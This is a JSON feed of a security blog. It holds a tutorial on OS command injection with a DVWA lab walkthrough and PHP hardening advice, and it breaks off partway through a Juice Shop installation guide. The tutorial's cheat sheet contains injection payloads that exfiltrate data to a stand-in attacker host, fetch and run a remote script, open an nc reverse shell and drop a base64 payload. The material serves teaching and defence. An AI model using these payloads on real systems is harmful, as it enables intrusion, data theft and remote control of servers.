{
    "version": "https://jsonfeed.org/version/1",
    "title": "Offens!ve Blogs - Sakibul Ali Khan",
    "description": "",
    "home_page_url": "https://sakibulalikhan.pages.dev",
    "feed_url": "https://sakibulalikhan.pages.dev/feed.json",
    "user_comment": "",
    "icon": "https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png",
    "author": {
        "name": "Sakibul Ali Khan"
    },
    "items": [
        {
            "id": "https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html",
            "url": "https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html",
            "title": "Exploring OS Command Injection: Understanding and Hands-On Practice",
            "summary": "Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p>Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll delve into the intricacies of OS Command Injection, providing both theoretical insights and practical demonstrations to equip pentesters and bug hunters with the knowledge and skills needed to identify and mitigate this vulnerability effectively. Let’s dive in!</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"part-1-understanding-os-command-injection\">Part 1: Understanding OS Command Injection</h2>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"what-is-os-command-injection\">What is OS Command Injection?</h3>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"597\" height=\"313\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-lg.png 1024w\"></figure>\n<p>OS Command Injection is a type of vulnerability where attackers can execute arbitrary commands on the underlying operating system by manipulating user-supplied input that is passed to system shell commands. This vulnerability arises when web applications incorporate user input directly into command strings without proper validation or sanitization.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"impact-of-os-command-injection\">Impact of OS Command Injection</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>The consequences of OS Command Injection can be severe, potentially leading to unauthorized access, data exfiltration, or even full control over the target system. Attackers can leverage this vulnerability to execute commands with the privileges of the vulnerable application, posing significant risks to the security and integrity of the system.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"distinguishing-os-command-injection-from-other-injection-attacks\">Distinguishing OS Command Injection from Other Injection Attacks</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>It’s essential to differentiate OS Command Injection from other injection attacks, such as Code Injection. While Code Injection involves injecting and executing arbitrary code within the application context, OS Command Injection focuses on manipulating system commands executed by the underlying operating system.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"real-world-examples\">Real-World Examples</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>We explore real-world instances of OS Command Injection vulnerabilities, including notable cases like CVE-2021-25296 in NagiosXI and CVE-2023-29084 in ManageEngine ADManagerPlus. These examples underscore the critical importance of identifying and addressing OS Command Injection vulnerabilities to mitigate security risks.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"preventive-measures\">Preventive Measures</h3>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"525\" height=\"246\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-lg.png 1024w\"></figure>\n</div>\n<div class=\"cl-preview-section\">\n<p>Effective prevention of OS Command Injection involves implementing robust input validation, avoiding direct invocation of system shell commands whenever possible, and utilizing safe APIs for handling user input. We discuss various preventive strategies and highlight the importance of proactive security measures in mitigating this vulnerability.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"command-injection-cheatsheet\">Command Injection Cheatsheet</h3>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>--------------------------------------------------------------------\nSpecial Characters\n&amp;\n;\nNewline (0x0a or \\n)\n&amp;&amp;\n|\n||\ncommand `\n$(command )\n--------------------------------------------------------------------\nUseful Commands: Linux\nwhoami\nifconfig\nls\nuname -a\n--------------------------------------------------------------------\nUseful Commands: Windows\nwhoami\nipconfig\ndir\nver\n--------------------------------------------------------------------\nBoth Unix and Windows supported\nls||id; ls ||id; ls|| id; ls || id \nls|id; ls |id; ls| id; ls | id \nls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id \nls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id \nls %0A id\n--------------------------------------------------------------------\nTime Delay Commands\n&amp; ping -c 10 127.0.0.1 &amp;\n--------------------------------------------------------------------\nRedirecting output\n&amp; whoami &gt; /var/www/images/output.txt &amp;\n--------------------------------------------------------------------\nOOB (Out Of Band) Exploitation\n&amp; nslookup attacker-server.com &amp;\n&amp; nslookup `whoami`.attacker-server.com &amp;\n-------------------------------------------------------------------\nWAF bypasses\nvuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O \n/tmp/reverse.php %0a php /tmp/reverse.php\nvuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;\nvuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload\n--------------------------------------------------------------------</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<div class=\"cl-preview-section\">\n<h2 id=\"part-2-hands-on-practical-demonstration\">Part 2: Hands-On Practical Demonstration</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>In this section, we do a hands-on lab solutions to demonstrate OS Command Injection techniques and detection methods. Pentesters and bug hunters can gain valuable insights into identifying and exploiting OS Command Injection vulnerabilities using practical scenarios.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"616\" height=\"589\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-lg.png 1024w\"></figure>\n<p>In this blog post, we'll explore Command Injection Vulnerabilities using DVWA version 1.10 as our playground. I've structured our exploration into two distinct phases: Attack and Securing The Code. You might wonder why I've started with the attack phase first. Well, since we have access to the source code from the beginning (assuming this is white-box testing), it makes sense to dive straight into demonstrating the attack. Later, we'll dissect the source code to understand its workings and discuss preventive measures. Let's begin by exploring the attack phase.</p>\n<h2 id=\"attack-phase\">1. Attack Phase:</h2>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"616\" height=\"591\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-lg.png 1024w\"></figure>\n<p>In the Command Injection tab, the system prompts the user for input and specifically requests an IP address to be entered into the designated form field. This input mechanism serves as the entry point for potential exploitation through Command Injection.</p>\n<h3 id=\"e04b\" class=\"pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj\">Command Injection: Low</h3>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"385\" height=\"319\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-lg.png 1024w\"></figure>\n<p>From the provided source code snippet, it's evident that the system lacks proper input validation. This means users can input any arbitrary integer or character instead of an actual IP Address. This oversight opens up the system to exploitation, as attackers can utilize various operators, also known as meta-characters, to deceive the shell into executing arbitrary commands.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"983\" height=\"939\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-lg.png 1024w\"></figure>\n<p>Once the shell executes <code>1.1.1.1;</code>, it proceeds to execute <code>pwd</code> as if it were part of the same shell command. This behavior occurs because the shell interprets the entire input string as a single command.</p>\n<h3 id=\"8d7c\" class=\"pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj\">Command Injection: Medium</h3>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"539\" height=\"422\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-lg.png 1024w\"></figure>\n<p>In the provided source code snippet, you can input a random integer or any character instead of the expected IP Address. Unfortunately, the system fails to validate user input, allowing anything to be entered. Additionally, the system substitutes the characters <code>&amp;&amp;</code> and <code>;</code>, replacing them with blanks in the array through a substitution function. However, you can still employ other operators, known as meta-characters, to deceive the shell into executing arbitrary commands.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"983\" height=\"942\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-lg.png 1024w\"></figure>\n<p>Once the shell executes <code>1.1.1.1 &amp;&amp;</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 &amp;&amp;</code> as part of a single command. Consequently, the shell believes there is another command pending execution, and <code>pwd</code> is executed accordingly.</p>\n<h3 id=\"e69d\" class=\"pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj\">Command Injection: High</h3>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"546\" height=\"519\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-lg.png 1024w\"></figure>\n<p>In the provided source code, you can input a random integer or any character instead of the expected IP Address because the system lacks proper validation of user input. Consequently, users can input anything. Additionally, the admin has implemented a trim function to remove any extra spaces in the first array [0] and the last array[∞].</p>\n<p>Moreover, the system substitutes several characters, triggering a substitutions function that replaces the character with a blank in the array when inputted. However, users can only use two operators, also known as meta-characters, to manipulate the shell into executing arbitrary commands. Specifically, users can utilize <code>|</code> without any space afterward, as the system will replace <code>|</code> if extra space is used. Similarly, users can employ <code>||</code>  for this purpose.</p>\n<p><strong>But how does it work when the operator is supposedly filtered?</strong></p>\n<p>When you input <code>1.1.1.1 | pwd</code>, the additional <code>|</code> is replaced with a blank in the array. Consequently, the final payload appears as <code>1.1.1.1 | pwd</code>.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"983\" height=\"941\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-lg.png 1024w\"></figure>\n<p>After the shell executes <code>1 |</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 |</code> as part of a single command. Therefore, the shell believes there is another command pending execution, leading to the execution of <code>pwd</code>.</p>\n<h3 id=\"c63b\" class=\"ny nz gr be oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bj\">2. Securing The Code</h3>\n<p>To enhance the security of this Command Injection Code, there are two crucial steps you can take:</p>\n<ol>\n<li><strong>Escaping Shell Arguments</strong></li>\n</ol>\n<p>In each level of source code complexity, the <code>shell_exec()</code> PHP function is utilized without incorporating the <code>escapeshellarg()</code> function. This practice should be rectified to bolster security measures.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"720\" height=\"388\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-lg.png 1024w\"></figure>\n<p>By implementing <code>escapeshellarg()</code>, every meta-character within a string is automatically escaped, and the string itself is encapsulated within quotes. This ensures that the string can be safely passed directly to the shell, where it will be treated as a single, secure argument.</p>\n<pre class=\"language-php line-numbers\"><code>&lt;?php\n\n// Bat Input\nif(isset($_POST['Submit'])) {\n    $target = $_REQUEST['ip'];\n\n    // Determine DS and execute the ping commend.\n    if(stristr(php_uname('s'), 'Windows NT')){\n        $cmd = shell_exec('ping ' . $target);\n    } else {\n        $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));\n    }\n\n    // Feedback for the end user\n    $html .= \"&lt;pre&gt; {$cmd}&lt;/pre&gt;\";\n\n}\n\n?&gt;</code></pre>\n<p>Now, even the Lowest Difficulty level is fortified against vulnerabilities. It's worth noting that by incorporating <code>escapeshellarg()</code>, the Low, Medium, and High Difficulty levels can achieve heightened security without the need for additional validation. For instance, even if the user inputs something other than an IP Address format, such as \"test\", the system remains secure.</p>\n<p><span class=\"nc gs\">2.</span><strong class=\"nc gs\"> Validate user input</strong> </p>\n<p>Upon reviewing each source code difficulty, it becomes apparent that the primary objective is to ping a designated IP Address. However, in the Low, Medium, and High Difficulty levels, the failure to validate user input permits users to input arbitrary values, such as characters, instead of adhering to the expected IP Address format. Consequently, it becomes imperative to implement user input validation.</p>\n<p>When user input validation is enforced, any attempt to input values other than the expected IP Address format will be rejected by the system, triggering an error message such as \"You have entered an invalid IP.\" This approach ensures that all input is rigorously validated, thereby sanitizing any potentially malicious input.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"conclusion\">Conclusion</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>OS Command Injection poses significant security risks to web applications, making it imperative for security professionals to understand, detect, and mitigate this vulnerability effectively. By combining theoretical understanding with hands-on practical demonstrations, pentesters and bug hunters can enhance their skills in identifying and addressing OS Command Injection vulnerabilities, ultimately strengthening the overall security posture of web applications.</p>\n</div>\n<h3 id=\"references-and-further-reading\">References and Further Reading:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/77.html\">CWE-77 Command Injection</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/78.html\">CWE-78 OS Command Injection</a></li>\n<li><a href=\"https://owasp.org/www-community/attacks/Command_Injection\">OWASP Command Injection</a></li>\n<li><a href=\"https://portswigger.net/web-security/os-command-injection\">Portswigger Web Security Academy Materials &amp; Labs</a></li>\n</ul>\n<p> </p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "OWASP 10",
                   "Command Injection"
            ],
            "date_published": "2024-02-12T05:12:16+06:00",
            "date_modified": "2024-02-12T05:12:16+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/cybersecurity-playground-installing-owasp-juice-shop-on-ubuntu-with-docker-a-step-by-step-guide.html",
            "url": "https://sakibulalikhan.pages.dev/cybersecurity-playground-installing-owasp-juice-shop-on-ubuntu-with-docker-a-step-by-step-guide.html",
            "title": "Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide",
            "summary": "In the realm of cybersecurity education and training, practical hands-on experience is invaluable. Recognizing this need, OWASP (Open Web Application Security Project) introduced the Juice&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p>In the realm of cybersecurity education and training, practical hands-on experience is invaluable. Recognizing this need, OWASP (Open Web Application Security Project) introduced the Juice Shop – an intentionally vulnerable web application designed to simulate real-world security challenges. This blog post aims to provide a detailed walkthrough on installing OWASP Juice Shop on Ubuntu using Docker, allowing enthusiasts and professionals alike to delve into the intricacies of web security in a controlled environment.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"what-is-owasp-juice-shop\">What is OWASP Juice Shop?</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://joshcgrossman.files.wordpress.com/2018/03/juiceshopctf_logo.png\" alt=\"Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide\" width=\"267\" height=\"320\" data-is-external-image=\"true\"></figure>\n<p>The OWASP Juice Shop is not your typical online store; it serves as a playground for security enthusiasts and professionals to hone their skills in identifying and exploiting web application vulnerabilities. Concealed beneath its facade as a fruit and vegetable juice shop lie 102 deliberately planted challenges of varying difficulty levels, representing common security vulnerabilities encountered in modern web development.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Juice Shop’s development commenced in September 2014, driven by the necessity for a contemporary security training environment that reflects the intricacies of current web technologies. Over the years, it has evolved into a sophisticated platform, leveraging modern frameworks such as Angular, JavaScript, Node.js, and SQLite for its database.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"vulnerability-categories\">Vulnerability Categories:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>In OWASP Juice Shop, vulnerabilities are meticulously categorized into various classes, covering a wide spectrum of risk and vulnerability types identified in well-known lists and documents such as <a href=\"https://owasp.org/www-project-top-ten/\" title=\"Sakibul Ali Khan\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP Top 10</a>, <a href=\"https://owasp.org/www-project-application-security-verification-standard/\" title=\"Sakibul Ali Khan\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP ASVS</a>, <a href=\"https://owasp.org/www-project-automated-threats-to-web-applications/\" title=\"Sakibul Ali Khan\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP Automated Threat Handbook</a>, <a href=\"https://owasp.org/www-project-api-security/\" title=\"Sakibul Ali Khan\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP API Security Top 10</a>, <a href=\"https://owasp.org/www-project-top-10-privacy-risks\" title=\"Sakibul Ali Khan\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP Top 10 Privacy Risks</a>, and MITRE’s <a href=\"https://cwe.mitre.org/\" title=\"Sakibul Ali Khan\" target=\"_blank\" rel=\"noopener noreferrer\">Common Weakness Enumeration (CWE)</a>. This structured approach enables users to target specific areas of interest and gain comprehensive insights into web application security.</p>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>Category Breakdown:</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide.png\" alt=\"Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide\" width=\"538\" height=\"357\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-lg.png 1024w\"></figure>\n<p><strong>Category Mappings:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<div class=\"table-wrapper\">\n<table>\n<thead>\n<tr>\n<th>Category</th>\n<th>OWASP</th>\n<th>CWE</th>\n<th>WASC</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Broken Access Control</td>\n<td>A1:2021, API1:2019, API5:2019</td>\n<td>CWE-22, CWE-285, CWE-639, CWE-918</td>\n<td>WASC-02, WASC-09, WASC-16</td>\n</tr>\n<tr>\n<td>Broken Anti-Automation</td>\n<td>OWASP-AT-004, API4:2019, OWASP-AT-010, …</td>\n<td>CWE-362</td>\n<td>WASC-11, WASC-21</td>\n</tr>\n<tr>\n<td>Broken Authentication</td>\n<td>A7:2021, API2:2019, P6:2021</td>\n<td>CWE-287, CWE-352</td>\n<td>WASC-01, WASC-49</td>\n</tr>\n<tr>\n<td>Cross Site Scripting (XSS)</td>\n<td>A3:2021, A7:2017</td>\n<td>CWE-79</td>\n<td>WASC-8</td>\n</tr>\n<tr>\n<td>Cryptographic Issues</td>\n<td>A2:2021</td>\n<td>CWE-326, CWE-327, CWE-328, CWE-950</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Improper Input Validation</td>\n<td>ASVS V5, API6:2019</td>\n<td>CWE-20</td>\n<td>WASC-20</td>\n</tr>\n<tr>\n<td>Injection</td>\n<td>A3:2021, API8:2019, P1:2021</td>\n<td>CWE-74, CWE-89</td>\n<td>WASC-19, WASC-28, WASC-31</td>\n</tr>\n<tr>\n<td>Insecure Deserialization</td>\n<td>A8:2021, A8:2017</td>\n<td>CWE-502</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Miscellaneous</td>\n<td>P5:2021</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Security Misconfiguration</td>\n<td>A5:2021, A9:2021, API7:2019, API9:2019, …</td>\n<td>CWE-209</td>\n<td>WASC-14, WASC-15</td>\n</tr>\n<tr>\n<td>Security through Obscurity</td>\n<td>A4:2021, P5:2021</td>\n<td>CWE-656</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Sensitive Data Exposure</td>\n<td>A3:2017, API3:2019, OTG-CONFIG-004, P2:2021</td>\n<td>CWE-200, CWE-530, CWE-548</td>\n<td>WASC-13</td>\n</tr>\n<tr>\n<td>Unvalidated Redirects</td>\n<td>A10:2013</td>\n<td>CWE-601</td>\n<td>WASC-38</td>\n</tr>\n<tr>\n<td>Vulnerable Components</td>\n<td>A6:2021</td>\n<td>CWE-829, CWE-506, CWE-1104</td>\n<td>-</td>\n</tr>\n<tr>\n<td>XML External Entities (XXE)</td>\n<td>A5:2021, A4:2017</td>\n<td>CWE-611</td>\n<td>WASC-43</td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>\n<div class=\"cl-preview-section\">\n<p>Each category represents a distinct aspect of web application security, ranging from access control and authentication to cryptographic issues and injection vulnerabilities. By aligning Juice Shop’s challenges with these standardized categories, users can effectively address specific security 